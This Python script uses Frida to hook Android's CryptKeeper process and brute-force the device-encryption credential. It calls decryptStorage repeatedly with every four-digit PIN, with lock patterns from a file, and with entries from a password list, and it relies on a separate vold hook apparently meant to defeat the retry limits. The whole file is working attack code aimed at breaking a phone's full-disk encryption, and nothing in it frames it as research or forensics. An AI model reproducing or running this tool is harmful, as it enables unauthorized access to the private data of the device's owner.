#!/usr/bin/env python

import frida
import sys
import time
import subprocess
import os
from itertools import combinations


cryptKeeperScript = """
rpc.exports = {
    testpassword: function(number){ 
        Java.perform(function () { 
            var blockLoop = true;
            Java.choose("android.os.storage.IStorageManager$Stub$Proxy", {
                onMatch: function (instance) {
                    if(blockLoop){
                        send(instance.decryptStorage(number));
                        blockLoop = false;
                    }
                },
                onComplete: function () { }

            });

        });
    }
}
"""

def on_message(message, data):  
    try:
        if message:
            if "{0}".format(message["payload"]) == "0" :
                print("Passcode FOUND! - Reboot to keep system sane!")
    except Exception as e:
        error = "error"


print("starting..")

procname = "com.android.settings:CryptKeeper"
print("Attaching to process:" + procname)
device = frida.get_usb_device()
session = device.attach(procname) 

script = session.create_script(cryptKeeperScript)

script.on('message', on_message)
script.load()
command = ""

while 1 == 1:
    print("1 > Bruteforce pincode 0000-9999")
    print("2 > Bruteforce pattern")
    print("3 > Bruteforce entries in PASSWORD.TXT")
    command = input("Select actitity and Press ENTER to start! !!- Verify that Hooking-vold.py is running -!!")
    if command == "1":
        for i in range(10000):
            pin = str(i).zfill(4)
            print("Testing : " + str(pin))
            result = script.exports.testpassword(str(pin).rstrip())
            if result is not None:
                print(result)
                sys.stdin.read()              
    elif command == "2":
        filepath = 'ALL_PATTERNS.txt'
        lineNr = subprocess.run(['wc', '-l',filepath], stdout=subprocess.PIPE).stdout.decode('utf-8').split(' ', 1)[0]
        with open(filepath) as fp:  
            for cnt, line in enumerate(fp):
                print("Testing ("+str(cnt+1)+"/"+str(lineNr)+"): " + str(line))
                result = script.exports.testpassword(line.rstrip());
                if result is not None:
                    print(result)
                    sys.stdin.read()
    elif command == "3":
        print("Bruteforcing PASSWORD.txt")
        filepath = 'PASSWORD.txt'
        lineNr = subprocess.run(['wc', '-l',filepath], stdout=subprocess.PIPE).stdout.decode('utf-8').split(' ', 1)[0]
        with open(filepath) as fp:  
            for cnt, line in enumerate(fp):
                print("Testing ("+str(cnt+1)+"/"+str(lineNr)+"): " + str(line))
                result = script.exports.testpassword(line.rstrip())
                if result is not None:
                    print(result)
                    sys.stdin.read()                
